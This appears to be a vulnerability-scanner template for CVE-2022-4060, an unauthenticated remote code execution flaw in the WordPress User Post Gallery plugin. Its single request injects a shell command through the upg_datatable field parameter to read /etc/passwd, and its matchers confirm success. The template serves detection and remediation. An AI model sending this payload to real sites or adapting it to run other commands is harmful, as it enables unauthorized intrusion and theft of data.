id: CVE-2022-4060
info:
  name: WordPress User Post Gallery <=2.19 - Remote Code Execution
  author: theamanrawat
  severity: critical
  description: The WordPress User Post Gallery plugin version 2.19 and below is vulnerable
    to remote code execution, allowing an attacker to execute malware, obtain sensitive
    information, modify data, and gain full control over a system without entering
    necessary credentials.
  reference:
  - https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e
  - https://wordpress.org/plugins/wp-upg/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-4060
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-4060
    cwe-id: CWE-94
  metadata:
    verified: 'true'
    impact: The vulnerability CVE-2022-4060 in the WordPress User Post Gallery plugin
      could impact users by allowing attackers to remotely execute code, compromising
      sensitive information and potentially gaining full control of a system without
      proper authorization.
    recommendation: I highly recommend immediately updating or removing the WordPress
      User Post Gallery plugin to mitigate the risk of remote code execution and prevent
      unauthorized access to sensitive information.
  tags: unauth,wpscan,cve2022,rce,wordpress,wp-plugin,wp,cve,wp-upg
requests:
- method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:head+-1+/etc/passwd:NULL:NULL'
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  - type: word
    part: header
    words:
    - application/json
  - type: word
    part: body
    words:
    - recordsFiltered
  - type: status
    status:
    - 200
